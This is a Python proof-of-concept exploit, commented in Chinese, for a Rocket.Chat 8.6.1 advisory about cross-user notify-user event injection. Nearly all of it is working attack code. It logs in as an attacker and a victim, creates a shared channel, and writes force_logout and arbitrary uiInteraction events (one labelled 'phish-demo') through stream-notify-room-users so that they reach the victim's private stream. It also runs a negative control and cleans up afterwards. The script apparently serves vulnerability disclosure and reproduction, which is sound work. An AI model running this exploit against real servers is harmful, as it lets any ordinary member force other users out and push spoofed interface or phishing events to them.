#!/usr/bin/env python3
"""
Rocket.Chat 8.6.1 — GHSA-r3v3-v742-55j5 跨用户 notify-user 事件注入 PoC
（GHSA-27jx-236m-3f5j 的不完整修复；8.6.2 才补事件名白名单）

原理
  apps/meteor/server/modules/notifications/notifications.module.ts 中
  streamRoomUsers('notify-room-users').allowWrite(eventName, ...args) 只校验调用者与房间的
  订阅关系，未对事件名 e 做白名单，随后 self.notifyUser(otherMemberId, e, ...args) ->
  streamUser.emit(`${otherMemberId}/${e}`, ...) 把该事件投递到房间其他成员的 notify-user 流。
  allowWrite 内的转发是副作用；其后的 return false 仅抑制 notify-room-users 本流的广播，
  不影响已经发生的跨用户投递。

前置：一个与受害者同处某房间的普通认证账号（无需管理员）。

用法：
  export RC_BASE=http://192.168.98.x:3000
  export RC_WS=ws://192.168.98.x:3000/websocket
  export RC_USER=attacker RC_PASS=...
  export RC_VICTIM=victim  RC_VICTIM_PASS=...
  python3 poc.py
"""
import asyncio, json, os, time, urllib.request, urllib.error
import websockets

BASE = os.environ.get("RC_BASE", "http://192.168.98.x:3000")
WS = os.environ.get("RC_WS", "ws://192.168.98.x:3000/websocket")
ATK_USER = os.environ.get("RC_USER", "rcprobe_atk")
ATK_PASS = os.environ["RC_PASS"]
VIC_USER = os.environ.get("RC_VICTIM", "rcprobe_vic")
VIC_PASS = os.environ.get("RC_VICTIM_PASS", ATK_PASS)


def post(path, obj, token=None, userid=None, timeout=20):
    h = {"Content-Type": "application/json"}
    if token:
        h["X-Auth-Token"] = token
        h["X-User-Id"] = userid
    req = urllib.request.Request(BASE + path, data=json.dumps(obj).encode(), headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        try:
            return e.code, json.loads(body)
        except Exception:
            return e.code, {"raw": body[:200]}


async def ddp_connect(token, label):
    ws = await websockets.connect(WS, open_timeout=10, max_size=None)
    await ws.send(json.dumps({"msg": "connect", "version": "1", "support": ["1"]}))
    while True:
        m = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
        if m.get("msg") == "connected":
            break
    await ws.send(json.dumps({"msg": "method", "method": "login", "params": [{"resume": token}], "id": "login"}))
    while True:
        m = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
        if m.get("msg") == "result" and m.get("id") == "login":
            assert not m.get("error"), f"{label} ddp login error: {m.get('error')}"
            print(f"[+] {label}: DDP 登录成功")
            return ws


async def subscribe(ws, event_name):
    await ws.send(json.dumps({"msg": "sub", "id": "s1", "name": "stream-notify-user", "params": [event_name]}))
    while True:
        m = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
        if m.get("msg") == "ready":
            print(f"[+] 已订阅 stream-notify-user {event_name}")
            return
        if m.get("msg") == "nosub":
            raise RuntimeError(f"订阅被拒绝: {m.get('error')}")


async def wait_events(ws, seconds):
    got = []
    end = time.time() + seconds
    while time.time() < end:
        try:
            m = json.loads(await asyncio.wait_for(ws.recv(), timeout=max(0.05, end - time.time())))
        except asyncio.TimeoutError:
            break
        if m.get("msg") == "ping":
            await ws.send(json.dumps({"msg": "pong"}))
        elif m.get("msg") == "changed":
            got.append(m["fields"])
    return got


async def main():
    print("=" * 72)
    print("Rocket.Chat 8.6.1 — 跨用户 notify-user 任意事件注入 (GHSA-r3v3-v742-55j5)")
    print("=" * 72)

    st, a = post("/api/v1/login", {"user": ATK_USER, "password": ATK_PASS})
    st2, v = post("/api/v1/login", {"user": VIC_USER, "password": VIC_PASS})
    assert st == 200 and st2 == 200, "登录失败"
    atk_id, atk_tok = a["data"]["userId"], a["data"]["authToken"]
    vic_id, vic_tok = v["data"]["userId"], v["data"]["authToken"]
    print(f"[+] 攻击者 {ATK_USER} = {atk_id}（普通用户）")
    print(f"[+] 受害者 {VIC_USER} = {vic_id}")

    st, r = post("/api/v1/channels.create", {"name": f"rcprobe-{int(time.time())}"}, atk_tok, atk_id)
    room_id = r["channel"]["_id"]
    print(f"[+] 攻击者创建频道 roomId = {room_id}")

    vic_ws = await ddp_connect(vic_tok, "victim")
    await subscribe(vic_ws, f"{vic_id}/force_logout")
    atk_ws = await ddp_connect(atk_tok, "attacker")

    # 阴性对照：受害者尚未加入房间
    print("\n[对照] 受害者未加入房间时，攻击者注入 force_logout：")
    await atk_ws.send(json.dumps({"msg": "method", "method": "stream-notify-room-users",
                                  "params": [f"{room_id}/force_logout"], "id": "w0"}))
    control = await wait_events(vic_ws, 3)
    print(f"       受害者收到事件数 = {len(control)}  （预期 0）")

    st, j = post("/api/v1/channels.join", {"roomId": room_id}, vic_tok, vic_id)
    print(f"[+] 受害者加入频道: HTTP {st}")
    await wait_events(vic_ws, 1.5)

    print("\n[测试1] 受害者在房间内，攻击者向 stream-notify-room-users 写 '<roomId>/force_logout'：")
    await atk_ws.send(json.dumps({"msg": "method", "method": "stream-notify-room-users",
                                  "params": [f"{room_id}/force_logout"], "id": "w1"}))
    ev1 = await wait_events(vic_ws, 4)
    for e in ev1:
        print(f"       受害者收到 notify-user 事件: {json.dumps(e)}")

    print("\n[测试2] 攻击者注入任意事件名 '<roomId>/uiInteraction'（受害者另订阅该流）")
    vic_ws2 = await ddp_connect(vic_tok, "victim(uiInteraction)")
    await subscribe(vic_ws2, f"{vic_id}/uiInteraction")
    await atk_ws.send(json.dumps({"msg": "method", "method": "stream-notify-room-users",
                                  "params": [f"{room_id}/uiInteraction", {"action": "phish-demo"}], "id": "w2"}))
    ev2 = await wait_events(vic_ws2, 4)
    for e in ev2:
        print(f"       受害者收到 notify-user 事件: {json.dumps(e)}")

    print("\n===== 结论 =====")
    print(f"对照(未同房间) 事件数: {len(control)}")
    print(f"测试1 force_logout 注入(同房间) 事件数: "
          f"{sum(1 for e in ev1 if e.get('eventName') == f'{vic_id}/force_logout')}")
    print(f"测试2 uiInteraction 注入(同房间) 事件数: "
          f"{sum(1 for e in ev2 if e.get('eventName') == f'{vic_id}/uiInteraction')}")
    ok = (len(control) == 0
          and any(e.get("eventName") == f"{vic_id}/force_logout" for e in ev1)
          and any(e.get("eventName") == f"{vic_id}/uiInteraction" for e in ev2))
    print("复现结果:", "成功（跨用户任意 notify-user 事件注入成立）" if ok else "未完全成立")

    st, d = post("/api/v1/channels.delete", {"roomId": room_id}, atk_tok, atk_id)
    print(f"[清理] channels.delete -> HTTP {st} {json.dumps(d)[:80]}")
    for w in (vic_ws, vic_ws2, atk_ws):
        await w.close()

asyncio.run(main())
